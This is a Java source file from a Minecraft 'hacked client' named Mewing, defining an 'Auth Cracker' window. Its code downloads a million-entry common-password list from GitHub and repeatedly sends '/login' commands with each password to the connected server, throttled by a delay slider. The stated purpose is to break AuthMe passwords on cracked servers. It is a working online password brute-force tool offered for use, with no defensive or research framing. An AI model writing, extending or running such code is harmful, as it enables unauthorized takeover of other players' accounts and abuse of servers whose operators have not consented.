/*
 * Mewing Hacked Client
 * Copyright (C) 2019-2024 coltonk9043
 *
 * Licensed under the GNU General Public License, Version 3 or later.
 * See <http://www.gnu.org/licenses/>.
 */

package net.mewing.gui.navigation.windows;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import com.mojang.logging.LogUtils;

import net.mewing.gui.components.ButtonComponent;
import net.mewing.gui.components.SeparatorComponent;
import net.mewing.gui.components.SliderComponent;
import net.mewing.gui.components.StackPanelComponent;
import net.mewing.gui.components.StringComponent;
import net.mewing.gui.navigation.Window;
import net.mewing.settings.types.FloatSetting;
import net.minecraft.client.Minecraft;

public class AuthCrackerWindow extends Window {
	private final ButtonComponent start;
	private final StringComponent startButtonText;

	private final FloatSetting delay = FloatSetting.builder().id("authcracker_delay").displayName("Delay").defaultValue(100f)
			.minValue(50f).maxValue(50000f).build();

	private final AuthCracker authCracker;

	Runnable startRunnable;
	Runnable endRunnable;

	public AuthCrackerWindow() {
		super("Auth Cracker", 185, 150);

		minWidth = 350f;
		StackPanelComponent stackPanel = new StackPanelComponent();
		stackPanel.setSpacing(4f);
		stackPanel.addChild(new StringComponent("AuthCracker"));
		stackPanel.addChild(new SeparatorComponent());

		StringComponent label = new StringComponent(
				"This panel can be used to break Auth passwords used in cracked servers.");
		stackPanel.addChild(label);

		SliderComponent slider = new SliderComponent(delay);
		stackPanel.addChild(slider);

		authCracker = new AuthCracker(delay);

		startRunnable = new Runnable() {
			@Override
			public void run() {
				authCracker.Start();
				startButtonText.setText("Cancel");
				start.setOnClick(endRunnable);
			}
		};

		endRunnable = new Runnable() {
			@Override
			public void run() {
				authCracker.Stop();
				startButtonText.setText("Start");
				start.setOnClick(startRunnable);
			}
		};

		start = new ButtonComponent(startRunnable);

		// Create Text inside button
		startButtonText = new StringComponent("Start");
		start.addChild(startButtonText);
		stackPanel.addChild(start);

		addChild(stackPanel);
	}
}

class AuthCracker {

	private Thread curThread;
	private boolean shouldContinue = true;
	private final Minecraft mc = Minecraft.getInstance();
	private final FloatSetting delay;

	public AuthCracker(FloatSetting delay) {
		this.delay = delay;
	}

	private long time = System.currentTimeMillis();

	private void RunAuthCracker() {
		LogUtils.getLogger().info("Mewing AuthMe Cracker Started.");
		URL url;
		Scanner s = null;
		try {
			URI uri = new URI(
					"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt");
			url = uri.toURL();
			s = new Scanner(url.openStream());
		} catch (IOException e) {
			e.printStackTrace();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		if (s != null) {
			while (shouldContinue && s.hasNextLine()) {
				if (System.currentTimeMillis() - time > delay.getValue().floatValue()) {
					String str = s.nextLine();
					while (mc.player == null) {
						try {
							TimeUnit.SECONDS.sleep(1);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
					if (mc.player.connection != null) {
						mc.player.connection.sendCommand("login " + str);
						time = System.currentTimeMillis();
					} else {
						LogUtils.getLogger().error("Network Handler is null");
					}
				}
			}
		}

		LogUtils.getLogger().info("Mewing AuthMe Cracker Stopped.");
	}

	public void Start() {
		curThread = new Thread(new Runnable() {
			@Override
			public void run() {
				RunAuthCracker();
			}
		});
		curThread.start();
	}

	public void Stop() {
		shouldContinue = false;
	}
}